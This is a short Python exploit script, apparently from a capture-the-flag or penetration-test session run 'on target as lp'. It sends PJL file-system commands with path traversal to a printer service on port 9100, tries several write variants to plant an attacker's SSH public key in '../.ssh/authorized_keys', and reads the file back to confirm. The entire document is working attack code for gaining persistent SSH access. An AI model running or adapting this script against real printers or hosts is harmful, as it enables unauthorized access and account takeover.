#!/usr/bin/env python3
"""Post-reset pivot attempts — run on target as lp."""
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
N = len(KEY)
PATH = "../.ssh/authorized_keys"


def one(payload: bytes, timeout: float = 8) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b""
    finally:
        s.close()


def two_phase(hdr: bytes) -> None:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    s.sendall(hdr)
    r1 = b""
    try:
        r1 = s.recv(256)
    except socket.timeout:
        pass
    s.sendall(KEY)
    try:
        r2 = s.recv(256)
    except socket.timeout:
        r2 = b"T"
    s.close()
    print("2ph", hdr[:60], "r1", r1[:40], "r2", r2[:40])


# prep
one(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
one(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())

tests = [
    f'@PJL FSAPPEND OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode() + KEY,
    f'@PJL FSWRT OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode() + KEY,
    f"@PJL FSAPPEND NAME={PATH} SIZE={N}\r\n".encode() + KEY,
    f'@PJL FSUPLOAD OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode() + KEY,
]
for i, t in enumerate(tests):
    print(i, repr(one(t)[:80]))

two_phase(f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode())
two_phase(f'@PJL FSAPPEND OFFSET=0 SIZE={N} NAME="{PATH}"\r\n'.encode())

q = one(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", q)
dl = one(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode(), 12)
print("DL", len(dl), dl[:120])